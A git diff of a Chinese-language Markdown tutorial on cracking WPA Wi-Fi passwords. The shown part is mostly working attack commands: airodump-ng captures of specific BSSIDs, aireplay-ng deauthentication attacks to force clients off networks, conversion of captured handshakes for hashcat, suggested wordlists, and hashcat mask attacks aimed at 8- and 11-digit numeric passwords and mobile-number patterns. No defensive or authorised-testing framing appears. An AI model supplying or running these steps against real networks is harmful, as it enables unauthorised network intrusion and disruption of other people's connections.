@@ -121,7 +121,7 @@ airodump-ng   -c 6 --bssid EA:9B:4B:A6:0C:6C -w /root/xx --ignore-negative-one  
 #设置5G wifi
 iw dev mon5 set freq 5180
 #监听5G频率wifi
-airodump-ng   -c 149  --bssid   5A:5A:69:54:7E:0E -w /root/xx --ignore-negative-one  mon5
+airodump-ng   -c 36 --bssid 50:0F:F5:66:E9:35 -w /root/xx --ignore-negative-one  mon5
 ```
 
 解释：  
@@ -138,7 +138,7 @@ airodump-ng   -c 149  --bssid   5A:5A:69:54:7E:0E -w /root/xx --ignore-negative-
 #断开连接2.4G wifi的客户端
 aireplay-ng -0 5 -c  16:51:FB:CD:7A:7E  -a   3E:41:A0:44:E8:43    --ignore-negative-one    mon24
 #断开连接5G wifi的客户端
-aireplay-ng -0 5 -c  16:51:FB:CD:7A:7E  -a   3E:41:A0:44:E8:43    --ignore-negative-one    mon5
+aireplay-ng -0 5 -c  9A:F7:27:4E:9B:C6  -a  8C:53:C3:84:15:F7    --ignore-negative-one    mon5
 
 ```
 
@@ -159,4 +159,27 @@ wifi up
 # 字典下载
 
 https://weakpass.com/
+推荐以下几个比较小的字典
+- ignis-10K.txt
+- rockyou-65.txt
+- hashmob.net_2025.small.found
+# 验证握手包并转换格式
+
+```shell
+aircrack-ng xx-02.cap #Encryption出现WPA(1 handshake)
+hcxpcapngtool -o output.hc22000 xx-02.cap #这里转换格式是为了方便导出到电脑上使用hashcat
+
+```
+
+# 暴力破解
+
+```shell
+#使用aircrack-ng简单跑字典
+aircrack-ng -w dict.txt simple-12345678.hc22000
+
+#使用hashcat 掩码暴力破解
+hashcat -m 22000 output.hc22000 -a 3 '?d?d?d?d?d?d?d?d' --potfile-disable  #8位纯数字
+hashcat -m 22000 output.hc22000 -a 3 '?d?d?d?d?d?d?d?d?d?d?d' --potfile-disable  #11位纯数字
+hashcat -m 22000 602.hc22000 -a 3 '1[3-9]?d?d?d?d?d?d?d?d?d?d' --potfile-disable #11位手机号
+```
 
